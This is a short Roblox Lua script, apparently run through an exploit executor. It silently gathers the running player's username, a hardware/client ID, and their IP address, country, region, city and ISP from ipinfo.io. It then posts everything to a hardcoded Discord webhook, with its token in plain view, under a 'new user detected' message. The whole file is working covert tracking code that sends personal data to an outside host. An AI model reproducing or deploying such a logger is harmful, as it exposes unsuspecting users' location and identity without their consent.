local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

local script_executed = _G.script_executed or "Not Found"

local function getIPInfo()
	local success, result = pcall(function()
		return HttpService:JSONDecode(game:HttpGet("https://ipinfo.io/json"))
	end)
	return success and result or {}
end

local info = getIPInfo()

local data = {
	username = player and player.Name or "Unknown",
	hwid = game:GetService("RbxAnalyticsService"):GetClientId(),
	country = info.country or "Unknown",
	region = info.region or "Unknown",
	city = info.city or "Unknown",
	isp = info.org or "Unknown",
	ip = info.ip or "Unknown",
	executed_script = script_executed
}

local url = "https://discord.com/api/webhooks/1246193092722724984/uxrDOWg8BY52O8dGvY23R7YOvZjBGJD4Q8Yag-iKN0hCcXYgyBOxB_jmCzUCRMI_lWnL"

pcall(function()
	HttpService:PostAsync(url, HttpService:JSONEncode({
		content = "**Nuevo usuario detectado**\n```json\n" .. HttpService:JSONEncode(data) .. "\n```"
	}))
end)